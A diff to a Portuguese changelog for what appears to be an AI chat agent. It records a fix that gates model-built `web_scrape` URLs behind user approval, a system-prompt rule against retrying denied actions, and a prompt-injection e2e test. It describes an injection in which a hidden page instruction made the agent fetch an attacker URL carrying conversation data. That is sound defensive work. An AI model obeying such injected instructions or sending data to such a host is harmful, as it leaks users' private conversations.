@@ -135,6 +135,16 @@ e o projeto adota o [Versionamento Semântico](https://semver.org/lang/pt-BR/).
   mostra a ferramenta e os argumentos inteiros da chamada, com "Permitir" e "Negar". O pedido vem
   do histórico, então continua na tela depois de recarregar a página; enviar outra mensagem o
   dispensa.
+- `web_scrape` só lê sem perguntar os endereços que o usuário escreveu na conversa ou que vieram
+  nas fontes da busca. Um endereço montado pelo modelo espera a autorização do usuário, que vê o
+  endereço inteiro. Fecha o vazamento em que uma instrução escondida numa página fazia o agente
+  ler `https://atacante/?d=<dados da conversa>`. O texto da resposta da busca e o conteúdo de
+  páginas lidas não contam como fonte de endereços.
+- System prompt: ações negadas pelo usuário não devem ser repetidas nem tentadas por outro caminho.
+- O LLM falso dos testes obedece a um comando `/tool` que venha no resultado de uma tool, como um
+  modelo enganado. O spec e2e `prompt-injection.spec.ts` usa isso para provar que a defesa vale
+  mesmo quando a injeção funciona: o pedido aparece, negar não envia nada, permitir executa, o
+  pedido sobrevive a recarregar a página e tudo vai para a auditoria.
 
 ## [0.2.0] - 2026-09-30
 
